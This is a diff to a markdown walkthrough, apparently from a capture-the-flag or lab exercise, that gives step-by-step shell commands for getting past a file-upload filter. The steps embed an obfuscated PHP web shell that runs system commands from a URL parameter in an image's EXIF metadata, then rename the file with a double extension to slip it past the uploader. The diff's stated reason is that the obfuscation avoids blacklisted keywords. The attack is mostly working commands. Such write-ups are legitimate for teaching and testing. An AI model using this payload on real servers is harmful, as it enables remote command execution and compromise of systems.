@@ -78,31 +78,39 @@
 
        
   Working Solution: Metadata Injection + Obfuscation 
+
+1. Copy a clean image
   
-     1. Use a clean, existing image
-            
-          ```bash
-          cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
-          ```
-                            
-          ![image](https://github.com/user-attachments/assets/d6660168-cb58-419d-b93f-e2ee53d6af1f)
+```bash
+cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
+```
+2. Create a discrete PHP payload (obfuscated)
   
-      
-     2. Inject an obfuscated PHP payload into the image’s metadata
-        ```bash
-          cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
-          ```
-      
-     This avoids all blacklisted keywords (system, eval, etc.)        
-      
-     3. Renommer l’image avec une double extension
-        ```bash
-          mv shell.png shell.php.png
-          ```
+```bash
+echo "<?php @call_user_func('system', \$_GET['cmd']); ?>" > payload.txt
+```
+
+3. Inject this payload into a discrete metadata
   
-     4. Upload successful  
+```bash
+exiftool -Artist="$(cat payload.txt)" shell.png
+```
+
+4. Rename the image to fool the uploader (double extension)
   
-     ![image](https://github.com/user-attachments/assets/24ff24d8-0afd-49c9-a9ed-a2ddf21052de)
+```bash
+mv shell.png shell.php.png
+```
+
+5. Check that your payload is there
+
+```bash
+exiftool shell.php.png
+```
+  
+6. Upload successful  
+  
+![image](https://github.com/user-attachments/assets/24ff24d8-0afd-49c9-a9ed-a2ddf21052de)
       
   
   The file passed the scan because :
